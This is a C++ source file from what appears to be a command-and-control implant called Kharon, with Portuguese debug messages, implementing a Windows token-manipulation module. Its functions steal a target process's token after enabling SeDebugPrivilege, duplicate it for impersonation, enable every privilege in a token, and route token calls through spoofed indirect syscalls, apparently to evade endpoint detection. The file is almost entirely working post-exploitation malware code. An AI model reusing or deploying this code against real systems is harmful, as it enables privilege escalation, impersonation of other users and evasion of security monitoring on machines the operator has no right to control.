#include <Kharon.h>

using namespace Root;

auto DECLFN Token::CurrentPs( VOID ) -> HANDLE {
    HANDLE hToken = nullptr;
    
    KhDbg("[Token::CurrentPs] Tentando abrir token da thread...");
    // Tenta primeiro o token da thread
    if ( !this->TdOpen( NtCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken ) || !hToken ) {
        KhDbg("[Token::CurrentPs] Falhou, tentando token do processo...");
        // Se falhar, usa o token do processo
        this->ProcOpen( NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken );
    }

    KhDbg("[Token::CurrentPs] Token handle: %p", hToken);
    return hToken;
}

auto DECLFN Token::CurrentThread( VOID ) -> HANDLE {
    HANDLE hToken = nullptr;
    
    KhDbg("[Token::CurrentThread] Abrindo token da thread...");
    this->TdOpen( NtCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken );
    KhDbg("[Token::CurrentThread] Token handle: %p", hToken);
    
    return hToken;
}

auto DECLFN Token::GetUser(
    _In_  HANDLE TokenHandle
) -> CHAR* {
    KhDbg("[Token::GetUser] Inicio - TokenHandle: %p", TokenHandle);
    
    TOKEN_USER*  TokenUserPtr = nullptr;
    SID_NAME_USE SidName      = SidTypeUnknown;
    NTSTATUS     NtStatus     = STATUS_SUCCESS;

    CHAR* UserDom   = nullptr;
    CHAR* Domain    = nullptr;
    CHAR* User      = nullptr;
    ULONG TotalLen  = 0;
    ULONG ReturnLen = 0;
    ULONG DomainLen = 0;
    ULONG UserLen   = 0;
    BOOL  Success   = FALSE;

    KhDbg("[Token::GetUser] Consultando tamanho necessário...");
    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
    if ( NtStatus != STATUS_BUFFER_TOO_SMALL ) {
        KhDbg("[Token::GetUser] Falha ao consultar tamanho: 0x%X", NtStatus);
        goto _KH_END;
    }
    KhDbg("[Token::GetUser] Tamanho necessário: %d bytes", ReturnLen);

    TokenUserPtr = ( PTOKEN_USER )hAlloc( ReturnLen );
    if ( !TokenUserPtr ) {
        KhDbg("[Token::GetUser] Falha ao alocar memória para TokenUser");
        goto _KH_END;
    }

    KhDbg("[Token::GetUser] Consultando informações do token...");
    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
    if ( !NT_SUCCESS( NtStatus ) ) { 
        KhDbg("[Token::GetUser] Falha ao consultar token: 0x%X", NtStatus);
        goto _KH_END; 
    }

    KhDbg("[Token::GetUser] Consultando tamanho do nome de usuário e domínio...");
    Success = Self->Advapi32.LookupAccountSidA(
        NULL, TokenUserPtr->User.Sid, NULL,
        &UserLen, NULL, &DomainLen, &SidName
    );

    if ( !Success && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
        KhDbg("[Token::GetUser] UserLen: %d, DomainLen: %d", UserLen, DomainLen);
        TotalLen = UserLen + DomainLen + 2;

        UserDom = (CHAR*)hAlloc( TotalLen );
        if ( !UserDom ) { 
            KhDbg("[Token::GetUser] Falha ao alocar UserDom");
            goto _KH_END; 
        }

        Domain = (CHAR*)hAlloc( DomainLen );
        User   = (CHAR*)hAlloc( UserLen );

        if ( !Domain || !User ) {
            KhDbg("[Token::GetUser] Falha ao alocar Domain ou User");
            goto _KH_END;
        }

        KhDbg("[Token::GetUser] Consultando nome de usuário e domínio...");
        Success = Self->Advapi32.LookupAccountSidA(
            NULL, TokenUserPtr->User.Sid, User,
            &UserLen, Domain, &DomainLen, &SidName
        );
        if ( !Success ) {
            KhDbg("[Token::GetUser] Falha ao consultar nome: %d", KhGetError);
            goto _KH_END;
        }
        
        KhDbg("[Token::GetUser] Domain: %s, User: %s", Domain, User);
        Str::ConcatA( UserDom, Domain );
        Str::ConcatA( UserDom, "\\" );
        Str::ConcatA( UserDom, User );
        KhDbg("[Token::GetUser] UserDom completo: %s", UserDom);
    }

_KH_END:
    if ( TokenUserPtr ) {
        hFree( TokenUserPtr );
    }

    if ( Domain ) {
        hFree( Domain );
    }

    if ( User ) {
        hFree( User );
    }

    if ( ! Success ) {
        if ( UserDom ) {
            hFree( UserDom );
        }
        UserDom = nullptr;
        KhDbg("[Token::GetUser] Retornando NULL (falha)");
    } else {
        KhDbg("[Token::GetUser] Retornando: %s", UserDom ? UserDom : "NULL");
    }
    
    return UserDom;
}

auto DECLFN Token::GetByID(
    _In_ ULONG TokenID
) -> TOKEN_NODE* {
    KhDbg("[Token::GetByID] Procurando TokenID: %d", TokenID);
    
    if ( ! this->Node ) {
        KhDbg("[Token::GetByID] Lista de tokens vazia");
        return nullptr;
    }

    TOKEN_NODE* Current = this->Node;
    ULONG count = 0;

    while ( Current ) {  
        count++;
        KhDbg("[Token::GetByID] Verificando node %d: TokenID=%d", count, Current->TokenID);
        if ( Current->TokenID == TokenID ) {
            KhDbg("[Token::GetByID] Token encontrado! Handle: %p", Current->Handle);
            return Current;
        }
        Current = Current->Next;
    }

    KhDbg("[Token::GetByID] Token não encontrado após verificar %d nodes", count);
    return nullptr;
}

auto DECLFN Token::Rev2Self( VOID ) -> BOOL {
    KhDbg("[Token::Rev2Self] Revertendo para self...");
    BOOL result = Self->Advapi32.RevertToSelf();
    KhDbg("[Token::Rev2Self] Resultado: %s", result ? "SUCCESS" : "FAILED");
    return result;
}

auto DECLFN Token::Rm(
    _In_ ULONG TokenID
) -> BOOL {
    KhDbg("[Token::Rm] Tentando remover TokenID: %d", TokenID);
    
    if ( ! this->Node ) {
        KhDbg("[Token::Rm] Lista de tokens vazia");
        return FALSE;
    }

    TOKEN_NODE* Current  = this->Node;
    TOKEN_NODE* Previous = nullptr;

    if ( Current->TokenID == TokenID ) {
        KhDbg("[Token::Rm] Removendo primeiro node da lista");
        this->Node = Current->Next;
        
        if ( Current->Handle && Current->Handle != INVALID_HANDLE_VALUE ) {
            Self->Ntdll.NtClose(Current->Handle);
        }
        
        if ( Current->User ) {
            hFree( Current->User );
        }
        
        hFree( Current );
        KhDbg("[Token::Rm] Token removido com sucesso");
        return TRUE;
    }

    while ( Current && Current->TokenID != TokenID ) {
        Previous = Current;
        Current  = Current->Next;
    }

    if ( ! Current ) {
        KhDbg("[Token::Rm] Token não encontrado na lista");
        return FALSE;  
    }

    KhDbg("[Token::Rm] Removendo token da lista");
    Previous->Next = Current->Next;

    if ( Current->Handle && Current->Handle != INVALID_HANDLE_VALUE ) {
        Self->Ntdll.NtClose(Current->Handle);
    }
    
    if ( Current->User ) {
        hFree( Current->User );
    }
    
    hFree( Current );
    KhDbg("[Token::Rm] Token removido com sucesso");
    return TRUE;
}

auto DECLFN Token::Use(
    _In_ HANDLE TokenHandle
) -> BOOL {
    KhDbg("[Token::Use] Tentando impersonar token: %p", TokenHandle);
    BOOL result = Self->Advapi32.ImpersonateLoggedOnUser( TokenHandle );
    KhDbg("[Token::Use] Resultado: %s (Error: %d)", result ? "SUCCESS" : "FAILED", KhGetError);
    return result;
}

auto DECLFN Token::Add(
    _In_ HANDLE TokenHandle,
    _In_ ULONG  ProcessID
) -> TOKEN_NODE* {
    KhDbg("[Token::Add] Inicio - TokenHandle: %p, ProcessID: %d", TokenHandle, ProcessID);
    
    if ( ! TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
        KhDbg("[Token::Add] Token handle inválido");
        return nullptr;
    }

    KhDbg("[Token::Add] Alocando novo node...");
    TOKEN_NODE* NewNode = (TOKEN_NODE*)hAlloc( sizeof(TOKEN_NODE) );
    if ( ! NewNode ) {
        KhDbg("[Token::Add] Falha ao alocar memória para node");
        return nullptr;
    }

    KhDbg("[Token::Add] Gerando TokenID único...");
    ULONG TokenID;
    ULONG attempts = 0;
    do {
        TokenID = Rnd32() % 9999;
        attempts++;
        if (attempts > 100) {
            KhDbg("[Token::Add] AVISO: Muitas tentativas para gerar ID único");
            break;
        }
    } while ( this->GetByID( TokenID ) );
    KhDbg("[Token::Add] TokenID gerado: %d (tentativas: %d)", TokenID, attempts);

    NewNode->Handle    = TokenHandle;
    NewNode->ProcessID = ProcessID;
    NewNode->TokenID   = TokenID;
    NewNode->Next      = nullptr;
    
    KhDbg("[Token::Add] Obtendo hostname...");
    NewNode->Host = Self->Machine.CompName;
    KhDbg("[Token::Add] Host: %s", NewNode->Host ? NewNode->Host : "NULL");
    
    KhDbg("[Token::Add] Obtendo username...");
    NewNode->User = this->GetUser(TokenHandle);
    KhDbg("[Token::Add] User obtido: %s", NewNode->User ? NewNode->User : "NULL");

    KhDbg("[Token::Add] Adicionando node à lista...");
    if ( ! this->Node ) {
        KhDbg("[Token::Add] Lista vazia, criando primeiro node");
        this->Node = NewNode; 
    } else {
        TOKEN_NODE* Current = this->Node;
        ULONG count = 1;
        while (Current->Next) {
            Current = Current->Next;
            count++;
        }
        KhDbg("[Token::Add] Adicionando após %d nodes existentes", count);
        Current->Next = NewNode; 
    }

    KhDbg("[Token::Add] Token adicionado com sucesso!");
    return NewNode;
}

auto DECLFN Token::ListPrivs(
    _In_  HANDLE  TokenHandle,
    _Out_ ULONG  &ListCount
) -> PVOID {
    KhDbg("[Token::ListPrivs] Inicio - TokenHandle: %p", TokenHandle);
    
    ULONG             TokenInfoLen = 0;
    TOKEN_PRIVILEGES* TokenPrivs   = nullptr;
    PRIV_LIST**       PrivList     = nullptr;

    KhDbg("[Token::ListPrivs] Consultando tamanho necessário...");
    Self->Advapi32.GetTokenInformation( TokenHandle, TokenPrivileges, nullptr, 0, &TokenInfoLen );
    KhDbg("[Token::ListPrivs] Tamanho: %d bytes", TokenInfoLen);

    TokenPrivs = (TOKEN_PRIVILEGES*)hAlloc( TokenInfoLen );
    if ( ! TokenPrivs ) {
        KhDbg("[Token::ListPrivs] Falha ao alocar memória");
        return nullptr;
    }

    KhDbg("[Token::ListPrivs] Obtendo informações de privilégios...");
    if ( ! Self->Advapi32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TokenInfoLen, &TokenInfoLen ) ) {
        KhDbg("[Token::ListPrivs] Falha ao obter informações: %d", KhGetError);
        hFree( TokenPrivs );
        return nullptr;
    }

    ListCount = TokenPrivs->PrivilegeCount;
    KhDbg("[Token::ListPrivs] Total de privilégios: %d", ListCount);
    
    PrivList  = (PRIV_LIST**)hAlloc( sizeof(PRIV_LIST*) * ListCount );
    if ( ! PrivList ) {
        KhDbg("[Token::ListPrivs] Falha ao alocar lista de privilégios");
        hFree( TokenPrivs );
        return nullptr;
    }

    for ( ULONG i = 0; i < ListCount; i++ ) {
        PrivList[i] = nullptr;
        
        LUID  luid     = TokenPrivs->Privileges[i].Luid;
        ULONG PrivLen  = MAX_PATH;
        CHAR* PrivName = (CHAR*)hAlloc( PrivLen );

        if ( ! PrivName ) {
            KhDbg("[Token::ListPrivs] Falha ao alocar nome do privilégio %d", i);
            continue; 
        }

        if ( !Self->Advapi32.LookupPrivilegeNameA( nullptr, &luid, PrivName, &PrivLen ) ) {
            KhDbg("[Token::ListPrivs] Falha ao obter nome do privilégio %d: %d", i, KhGetError);
            hFree( PrivName );
            continue;
        }

        PrivList[i] = (PRIV_LIST*)hAlloc( sizeof( PRIV_LIST ) );
        if ( ! PrivList[i] ) {
            KhDbg("[Token::ListPrivs] Falha ao alocar estrutura do privilégio %d", i);
            hFree( PrivName );
            continue;
        }

        PrivList[i]->PrivName   = PrivName;
        PrivList[i]->Attributes = TokenPrivs->Privileges[i].Attributes;
        KhDbg("[Token::ListPrivs] Privilégio %d: %s (Attr: 0x%X)", i, PrivName, TokenPrivs->Privileges[i].Attributes);
    }

    hFree( TokenPrivs );
    KhDbg("[Token::ListPrivs] Retornando lista de privilégios");

    return PrivList;
}

auto DECLFN Token::GetPrivs(
    _In_ HANDLE TokenHandle
) -> BOOL {
    KhDbg("[Token::GetPrivs] Inicio - TokenHandle: %p", TokenHandle);
    
    ULONG PrivListLen = 0;
    PVOID RawPrivList = this->ListPrivs( TokenHandle, PrivListLen );
    if ( !RawPrivList ) {
        KhDbg("[Token::GetPrivs] Falha ao obter lista de privilégios");
        return FALSE;
    }

    PRIV_LIST** PrivList = static_cast<PRIV_LIST**>( RawPrivList );
    KhDbg("[Token::GetPrivs] Habilitando %d privilégios...", PrivListLen);

    for ( ULONG i = 0; i < PrivListLen; i++ ) {
        if ( ! PrivList[i] ) continue;

        KhDbg("[Token::GetPrivs] Habilitando: %s", PrivList[i]->PrivName);
        this->SetPriv( TokenHandle, PrivList[i]->PrivName );

        if ( PrivList[i]->PrivName ) {
            hFree( PrivList[i]->PrivName );
        }

        hFree( PrivList[i] );
    }

    hFree( PrivList );
    KhDbg("[Token::GetPrivs] Privilégios habilitados com sucesso");

    return TRUE;
}

auto DECLFN Token::Steal(
    _In_ ULONG ProcessID
) -> TOKEN_NODE* {
    KhDbg("[Token::Steal] ========== INICIO ==========");
    KhDbg("[Token::Steal] Target ProcessID: %d", ProcessID);
    
    HANDLE      TokenHandle     = INVALID_HANDLE_VALUE;
    HANDLE      TokenDuplicated = INVALID_HANDLE_VALUE;
    HANDLE      ProcessHandle   = INVALID_HANDLE_VALUE;

    KhDbg("[Token::Steal] Obtendo token atual para SeDebugPrivilege...");
    HANDLE hCurrentToken = this->CurrentPs();
    if ( hCurrentToken ) {
        KhDbg("[Token::Steal] Token atual obtido: %p", hCurrentToken);
        this->SetPriv( hCurrentToken, "SeDebugPrivilege" );
        Self->Ntdll.NtClose( hCurrentToken );
    } else {
        KhDbg("[Token::Steal] AVISO: Falha ao obter token atual");
    }

    // Tenta abrir com PROCESS_QUERY_LIMITED_INFORMATION primeiro (menos restritivo)
    KhDbg("[Token::Steal] Tentando abrir processo com PROCESS_QUERY_LIMITED_INFORMATION...");
    ProcessHandle = Self->Ps->Open( PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessID );
    if ( !ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
        KhDbg("[Token::Steal] Falhou (Error: %d), tentando PROCESS_QUERY_INFORMATION...", KhGetError);
        // Se falhar, tenta com PROCESS_QUERY_INFORMATION
        ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, FALSE, ProcessID );
        if ( !ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
            KhDbg("[Token::Steal] ERRO: Falha ao abrir processo target (Error: %d)", KhGetError);
            goto _KH_END;
        }
    }
    KhDbg("[Token::Steal] Processo aberto com sucesso: %p", ProcessHandle);

    KhDbg("[Token::Steal] Abrindo token do processo...");
    if ( !this->ProcOpen( ProcessHandle,
        TOKEN_DUPLICATE | TOKEN_QUERY,
        &TokenHandle ) || TokenHandle == INVALID_HANDLE_VALUE ) {
        KhDbg("[Token::Steal] ERRO: Falha ao abrir token do processo (Error: %d)", KhGetError);
        goto _KH_END;
    }
    KhDbg("[Token::Steal] Token aberto com sucesso: %p", TokenHandle);

    Self->Ntdll.NtClose( ProcessHandle );
    ProcessHandle = INVALID_HANDLE_VALUE;
    KhDbg("[Token::Steal] Handle do processo fechado");

    KhDbg("[Token::Steal] Tentando duplicar token...");
    if ( Self->Advapi32.DuplicateTokenEx(
        TokenHandle,
        MAXIMUM_ALLOWED,
        nullptr,
        SecurityImpersonation,
        TokenImpersonation,
        &TokenDuplicated ) 
    ) {
        KhDbg("[Token::Steal] Token duplicado com sucesso: %p", TokenDuplicated);
        Self->Ntdll.NtClose( TokenHandle );
        KhDbg("[Token::Steal] Adicionando token duplicado à lista...");
        TOKEN_NODE* result = this->Add( TokenDuplicated, ProcessID );
        KhDbg("[Token::Steal] ========== FIM (SUCESSO) ==========");
        return result;
    } else {
        KhDbg("[Token::Steal] AVISO: DuplicateTokenEx falhou (Error: %d), usando token original", KhGetError);
        KhDbg("[Token::Steal] Adicionando token original à lista...");
        TOKEN_NODE* result = this->Add( TokenHandle, ProcessID );
        KhDbg("[Token::Steal] ========== FIM (TOKEN ORIGINAL) ==========");
        return result;
    }

_KH_END:
    KhDbg("[Token::Steal] Limpeza de handles...");
    if ( TokenHandle != INVALID_HANDLE_VALUE ) {
        Self->Ntdll.NtClose( TokenHandle );
        KhDbg("[Token::Steal] TokenHandle fechado");
    }

    if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
        Self->Ntdll.NtClose( ProcessHandle );
        KhDbg("[Token::Steal] ProcessHandle fechado");
    }

    KhDbg("[Token::Steal] ========== FIM (FALHA) ==========");
    return nullptr;
}


auto DECLFN Token::SetPriv(
    _In_ HANDLE Handle,
    _In_ CHAR*  PrivName
) -> BOOL {
    KhDbg("[Token::SetPriv] Habilitando privilégio: %s (Handle: %p)", PrivName, Handle);
    
    LUID Luid = { 0 };
    TOKEN_PRIVILEGES Privs = { 0 };
    BOOL Success = FALSE;

    Success = Self->Advapi32.LookupPrivilegeValueA( nullptr, PrivName, &Luid );
    if ( !Success ) {
        KhDbg("[Token::SetPriv] Falha ao consultar valor do privilégio: %d", KhGetError);
        return Success;
    }

    Privs.PrivilegeCount           = 1;
    Privs.Privileges[0].Luid       = Luid;
    Privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    Success = Self->Advapi32.AdjustTokenPrivileges( Handle, FALSE, &Privs, sizeof( TOKEN_PRIVILEGES ), nullptr, 0 );
    KhDbg("[Token::SetPriv] Resultado: %s (Error: %d)", Success ? "SUCCESS" : "FAILED", KhGetError);
    return Success;
}

auto DECLFN Token::TdOpen(
    _In_  HANDLE  ThreadHandle,
    _In_  ULONG   RightsAccess,
    _In_  BOOL    OpenAsSelf,
    _Out_ HANDLE* TokenHandle
) -> BOOL {
    KhDbg("[Token::TdOpen] ThreadHandle: %p, Rights: 0x%X", ThreadHandle, RightsAccess);
    
    const UINT32 Flags = Self->Config.Syscall;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if ( Flags == SYSCALL_NONE || !Flags ) {
        KhDbg("[Token::TdOpen] Usando OpenThreadToken direto");
        BOOL result = Self->Advapi32.OpenThreadToken(
            ThreadHandle, RightsAccess, OpenAsSelf, TokenHandle
        );
        KhDbg("[Token::TdOpen] Resultado: %s (Error: %d)", result ? "SUCCESS" : "FAILED", KhGetError);
        return result;
    }

    UPTR Address = (Flags & SYSCALL_SPOOF_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].Instruction
        : (UPTR)Self->Ntdll.NtOpenThreadTokenEx;

    UPTR ssn = (Flags & SYSCALL_SPOOF_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].ssn
        : 0;

    KhDbg("[Token::TdOpen] Usando syscall (Address: %p, SSN: %d)", Address, ssn);
    Status = Self->Spf->Call(
        Address, ssn, (UPTR)ThreadHandle, (UPTR)RightsAccess,
        (UPTR)OpenAsSelf, 0, (UPTR)TokenHandle
    );

    Self->Usf->NtStatusToError(Status);
    KhDbg("[Token::TdOpen] Status: 0x%X, Success: %s", Status, NT_SUCCESS(Status) ? "TRUE" : "FALSE");
    return NT_SUCCESS(Status);
}

auto DECLFN Token::ProcOpen(
    _In_  HANDLE  ProcessHandle,
    _In_  ULONG   RightsAccess,
    _Out_ HANDLE* TokenHandle
) -> BOOL {
    KhDbg("[Token::ProcOpen] ProcessHandle: %p, Rights: 0x%X", ProcessHandle, RightsAccess);
    
    const UINT32 Flags  = Self->Config.Syscall;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( Flags == SYSCALL_NONE ) {
        KhDbg("[Token::ProcOpen] Usando OpenProcessToken direto");
        BOOL result = Self->Advapi32.OpenProcessToken(
            ProcessHandle, RightsAccess, TokenHandle
        );
        KhDbg("[Token::ProcOpen] Resultado: %s (TokenHandle: %p, Error: %d)", 
              result ? "SUCCESS" : "FAILED", *TokenHandle, KhGetError);
        return result;
    }

    UPTR Address = ( Flags & SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].Instruction
        : (UPTR)Self->Ntdll.NtOpenProcessTokenEx;

    UPTR ssn = ( Flags & SYSCALL_SPOOF_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].ssn
        : 0;

    KhDbg("[Token::ProcOpen] Usando syscall (Address: %p, SSN: %d)", Address, ssn);
    Status = Self->Spf->Call(
        Address, ssn, (UPTR)ProcessHandle, (UPTR)RightsAccess,
        0, (UPTR)TokenHandle
    );

    Self->Usf->NtStatusToError( Status );
    KhDbg("[Token::ProcOpen] Status: 0x%X, Success: %s, TokenHandle: %p", 
          Status, NT_SUCCESS(Status) ? "TRUE" : "FALSE", *TokenHandle);

    return NT_SUCCESS( Status );
}
